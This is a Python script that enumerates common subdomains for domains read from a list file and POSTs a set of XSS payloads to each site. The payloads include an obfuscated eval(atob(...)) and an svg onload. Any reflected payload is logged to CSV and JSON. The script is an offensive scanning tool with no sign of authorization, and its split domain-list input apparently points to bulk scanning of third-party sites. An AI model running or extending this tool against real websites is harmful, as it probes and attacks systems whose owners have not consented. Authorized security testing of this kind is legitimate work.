import requests
from bs4 import BeautifulSoup
import urllib.parse
import csv
import json
import time
import os

# Advanced impactful XSS payloads (reduced for sophistication)
payloads = [
    '<input autofocus onfocus=alert(1)>',
    '<svg onload=alert(1)>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    '</script><svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
]

visited_urls = set()
subdomains = set()

# Subdomain brute-force list
subdomain_list = ['www', 'blog', 'mail', 'admin', 'test', 'shop', 'support', 'dev', 'api', 'forum']

# Initialize CSV and JSON files
csv_file = "results.csv"
json_file = "results.json"

# Function to log results into CSV
def log_to_csv(data):
    with open(csv_file, mode='a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(data)

# Function to log results into JSON
def log_to_json(data):
    with open(json_file, mode='a', encoding='utf-8') as file:
        json.dump(data, file)
        file.write('\n')

# Function to read domains from a text file
def read_domains(file_path):
    if not os.path.exists(file_path):
        print(f"Domain file {file_path} does not exist.")
        return []
    with open(file_path, 'r') as file:
        domains = [line.strip() for line in file if line.strip()]
    return domains

# Subdomain enumeration (brute-force common subdomains)
def enumerate_subdomains(domain):
    print(f"Enumerating subdomains for {domain}...")
    for sub in subdomain_list:
        subdomain_url = f"http://{sub}.{domain}"
        try:
            response = requests.get(subdomain_url, timeout=10)  # Increased timeout
            if response.status_code == 200:
                print(f"Discovered subdomain: {subdomain_url}")
                subdomains.add(subdomain_url)
        except requests.RequestException:
            pass  # If a subdomain doesn't exist or is unreachable, skip it

# Test a URL with XSS payloads
def test_xss(url):
    for payload in payloads:
        try:
            print(f"Testing payload on {url}: {payload}")
            # Send payload
            response = requests.post(url, data={"input": payload}, timeout=30)  # Increased timeout
            
            # Check if the payload is reflected in the response
            if payload in response.text:
                print(f"Potential XSS found with payload: {payload}")
                result = {"url": url, "payload": payload, "vulnerability_type": "Potential XSS", "response_status": response.status_code, "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                log_to_csv([url, payload, "Potential XSS", response.status_code, time.strftime('%Y-%m-%d %H:%M:%S')])
                log_to_json(result)
            else:
                print(f"No XSS detected with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error testing {url} with payload: {payload}, Error: {str(e)}")
            log_to_csv([url, payload, "Request Error", None, time.strftime('%Y-%m-%d %H:%M:%S')])

# Main function to run XSS tests on each domain
def main():
    # Read domains from 'domains.txt'
    domains = read_domains('split_domains/domains_part_1.txt')
    
    # If domains are found
    if domains:
        for domain in domains:
            print(f"Testing domain: {domain}")
            
            # Enumerate subdomains first
            enumerate_subdomains(domain)
            
            # Test the main domain and all discovered subdomains for XSS
            all_urls = [f"http://{domain}"] + [f"https://{domain}"] + list(subdomains)
            
            for url in all_urls:
                if url not in visited_urls:
                    visited_urls.add(url)
                    test_xss(url)
    else:
        print("No domains found in domains.txt.")

if __name__ == "__main__":
    main()
